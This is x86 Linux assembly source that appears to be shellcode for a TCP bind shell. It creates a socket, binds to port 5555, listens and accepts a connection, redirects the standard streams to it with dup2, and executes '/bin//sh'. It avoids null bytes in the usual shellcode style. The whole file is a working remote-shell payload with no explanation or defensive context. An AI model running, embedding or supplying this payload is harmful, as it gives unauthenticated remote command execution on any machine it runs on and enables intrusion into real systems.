
global _start
section .text
  _start:
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x1

    xor ecx, ecx
    push ecx
    push ebx
    push 0x2

    mov ecx, esp
    int 0x80

    xor edi, edi
    mov edi, eax

    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x2

    xor ecx, ecx
    push ecx
    push word 0xb315
    push word bx
    mov ecx, esp

    push 0x10
    push ecx
    push edi
    mov ecx, esp
    int 0x80

    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x4

    xor ecx, ecx
    push ecx
    push edi
    mov ecx, esp
    int 0x80

    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x5
    xor ecx, ecx
    push ecx
    push ecx
    push edi
    mov ecx, esp
    int 0x80
    xor ebx, ebx
    mov ebx, eax
    xor ecx, ecx
    mov cl, 0x2
  dup2:
    mov al, 0x3f
    int 0x80
    dec ecx
    jns dup2
    xor eax, eax
    mov al, 0xb
    xor ebx, ebx
    push ebx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
